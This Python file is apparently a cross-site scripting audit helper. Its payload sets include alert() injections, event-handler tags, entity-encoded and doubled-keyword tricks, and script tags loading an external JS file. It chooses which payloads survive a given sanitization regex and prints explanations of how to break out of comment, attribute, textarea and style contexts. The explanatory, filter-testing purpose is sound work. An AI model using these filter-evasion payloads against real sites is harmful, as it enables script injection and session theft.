load_set = {'<input onfocus=write`1` autofocus>', '<img src onerror=alert`1`>',
            '<svg onload=alert`1` >', '<script>alert`1`</script>', '<a href="javascript:alert`1`">clickme</a>',
            '<input onfocus=write(1) autofocus>', '<img src onerror=alert(1)>',
            '<svg onload=alert(1) >', '<script>alert(1)</script>', '<a href="javascript:alert(1)">clickme</a>', '<img src=1 onerror=alert&#96;1&#96;>',
            '<script src="https://xss.haozi.me/j.js"></script>',
            '<SCRIPT>alert`1`</SCRIPT>', '<SCRIPT src="https://xss.haozi.me/j.js"></SCRIPT>'}

A = {'<input onfocus=write(1) autofocus>', '<img src onerror=alert(1)>', '<svg onload=alert(1) >',
     '<script>alert(1)</script>', '<a href="javascript:alert(1)">clickme</a>'}
B = {'<input onfocus=write`1` autofocus>', '<img src onerror=alert`1`>',
            '<svg onload=alert`1` >', '<script>alert`1`</script>', '<a href="javascript:alert`1`">clickme</a>'}
C = {'<sscriptcript>alert`1`</sscriptcript>', '<SCRIPT>alert`1`</SCRIPT>'}
D = {'<input onfocus=write`1` autofocus>', '<img src onerror=alert`1`>', '<svg onload=alert`1` >',
     '<input onfocus=write(1) autofocus>', '<img src onerror=alert(1)>', '<svg onload=alert(1) >',
     '<img src=1 onerror=alert&#96;1&#96;>'}


def find_pl(element, flag_list, upper):
    pays = load_set
    if upper == True:
        pays = {'<script src="https://xss.haozi.me/j.js"></script>', '<SCRIPT src="https://xss.haozi.me/j.js"></SCRIPT>',
                '<scrscriptipt src="https://xss.haozi.me/j.js"></scrscriptipt>'}
    if ')' in element:
        pays -= A
    if '`' in element:
        pays -= B
        pays -= C
    if 'script' in element:
        pays -= {'<script>alert`1`</script>', '<script>alert(1)</script>', '<script src="https://xss.haozi.me/j.js"></script>'}
        pays.update({'<sscriptcript>alert`1`</sscriptcript>', })
        if 'i' in flag_list:
            pays -= {'<SCRIPT>alert`1`</SCRIPT>', '<SCRIPT src="https://xss.haozi.me/j.js"></SCRIPT>'}
    if 'on.*=' in element:
        pays -= D
        if 'i' not in flag_list:
            pays.update({'<img src=1 ONEERROR=alert&#96;1&#96;>', '<sscriptcript src="https://xss.haozi.me/j.js"></sscriptcript>'})
            if ')' not in element:
                pays.update({'<input ONFOCUS=write(1) autofocus>', '<img src ONERROR=alert(1)>', '<svg ONLOAD=alert(1) >'})
            if '`' not in element:
                pays.update({'<input ONFOCUS=write`1` autofocus>', '<img src ONERROR=alert`1`>', '<svg ONLOAD=alert`1` >'})
    if 'auto' in element:
        pays -= {'<input ONFOCUS=write`1` autofocus>', '<input ONFOCUS=write(1) autofocus>'}
        if ')' not in element:
            pays.update({'<input ONFOCUS=write(1) AUTOFOCUS>'})
        if '`' not in element:
            pays.update({'<input ONFOCUS=write(1) AUTOFOCUS>'})
    if '>' in element:
        pays = None
    return pays

def report_replace(element, flag_list, upper):
    if 'g' in flag_list:
        print('You use flag \'g\' in your replaces sanitization. The g flag stands for "global". '
              'This means that the regular expression will be tested against all possible matches in a string '
              'instead of stopping after the first match it finds.')
        print()
    if 'i' in flag_list:
        print('You use flag \'i\' in your replaces sanitization. The i flag stands for "insensitive". '
              'This means that the regular expression will be tested in a case-insensitive manner')
        print()
    if upper == True:
        print('You use menthod input.toUpperCase() to sanitize the input. This is a good way to prevent'
              'injection of javascript. However, while javascript distinguishes capitals from lower case letters, '
              'capital letters doesn\'s affect the funionality of HTML tags. Thus, although we directly construct js injection,'
              'we can use <script> tag to load j.js with alert(1), something like \'<script src="https://xss.haozi.me/j.js"></script>\' '
              'an external link contain .js or a local .js file. The URL is not affected by the Capitalization.'
              'In a script tag, the src attribute is used to include an external JavaScript file. '
              'The browser fetches the file and executes the JavaScript code contained in it.')
        print()
    if ')' in element:
        print('Your input sanitization replaces \')\', which stops hacker from constructing \'alert(1)\'. '
              'However, you don\'t replace \'`\' at the same time, hacker may constuct \'alert`1`\', '
              'which can still precess the attack.')
        print()
    if '`' in element:
        print('Your input sanitization replaces \'`\', which stops hacker from constructing \'alert`1`\'. '
              'However, hacker could still process XSS attack by using HTML entity code to bypass the sanitization. '
              'For example: \'<img src=1 onerror=alert&#96;1&#96;>\'. Meanwhile, it is also possible to '
              'conduct xss attack by directly referencing external js files, such as \'<script src="https://xss.haozi.me/j.js"></script>\'')
        print()
    if '>' in element:
        print('Your input sanitization replaces \'>\', which stops hacker from constructing any html tags with \'<>\' '
              'However, xss attack is still possible utilize the error toleration of HTML to conduct attack.'
              ' HTML allows sometimes can be execute without the last \'>\'. ')
        print()
    if 'script' in element:
        print('Your input sanitization replaces \'script\', which stops hacker from dicrectly using \'script\' string.'
              'Hacker can conduct attack by double writing \'script\', such as <sscriptcript>alert`1`</sscriptcript>'
              'Hacker can also conduct the attack by using other payloads that use HTML tags other than \'script\', '
              'such as \'<a href="javascript:alert(1)">clickme</a>\'')
        if 'i' not in flag_list:
            print('Hacker can also conduct the attack by capitalize the letter of \'script\' since capital letters doesn\'s affect the funionality of HTML tags')
        print()
    if 'on.*=' in element:
        print('Your input sanitization replaces \'on.*=\', which stops hacker from dicrectly using anything string start with '
              '\'on\' and end \'=\'. This means that any payloads with \'onfocus\', \'onerror\', \'onload\', and \'onmousemove\' is forbiddened.'
              'Hacker can bypass this sanitization by adding newline character between \'on\' and \'=\'. '
              'Hacker can still conduct attack by using other payloads that use HTML tags other than \'script\', '
              'such as \'<a href="javascript:alert(1)">clickme</a>\'')
        if 'i' not in flag_list:
            print('Hacker can also conduct the attack by capitalize the letter of \'ON\' since capital letters doesn\'s affect the funionality of HTML tags')
        print()


def check_right(right, pattern):
    addon = None
    print(right)
    if right == '-->':
        print('Your code puts input within the comments tag, preventing anything malicious and suspicious '
              'html tags or javascript elements in the input being executed by the application. Thus, we must close html comment in advanced.')
        print(f'This output encoding strategy can by bypass by appended \'-->\' before the desire payloads.')
        if '-->' in pattern:
            addon = '--!>'
            print('Your input sanitization filters \'-->\', prevent directly appending \'-->\' to break the comment item. '
                  'HTML comment support two kind of expression: \'<!-- xxx -->\' and \'<!-- xxx --!>\'. Thus, we can append \'-->\' '
                  'before payloads to bypass.')
        else:
            addon = '-->'
    elif right == '\">':
        print('Your code puts input within the HTML tag and turns the sinput into string, preventing anything malicious and suspicious '
              'html tags or javascript elements in the input being executed by the application. Thus, we must close both \'\"\' and \'>\' in advanced.')
        print(f'This output encoding strategy can by bypass by appended \'\">\' before the desire payloads.')
        addon = '\">'
    elif right == '</textarea>':
        print('Your code puts input within the <textarea> tag. Because anything inside this tag is interpret as plain text, '
              'the javascript inside it cannot be executed, preventing anything malicious and suspicious '
              'html tags or javascript elements in the input being executed by the application. Thus, we must close <textarea> tag in advanced.')
        print(f'This output encoding strategy can by bypass by appended \'</textarea>\' before the desire payloads.')
        addon = '</textarea>'
    elif right == '</style>':
        print(
            'Your code puts input within the <style> tag, preventing anything malicious and suspicious '
            'html tags or javascript elements in the input being executed by the application. Thus, we must close <style> tag in advanced.')
        print(f'This output encoding strategy can by bypass by appended \'</style>\' before the desire payloads.')
        if '<\/style>' in pattern:
            addon = '</style >'
            print(
                'Your input sanitization filters \'</style>\', prevent directly appending \'</style>\' to break the <style> tag. '
                'HTML has error toleration where when we add whitespace inside \'</style>\', the tag still works. Thus, '
                'we append \'</style >\' before payloads to bypass.')
        else:
            addon = '</style>'
    print()
    return addon


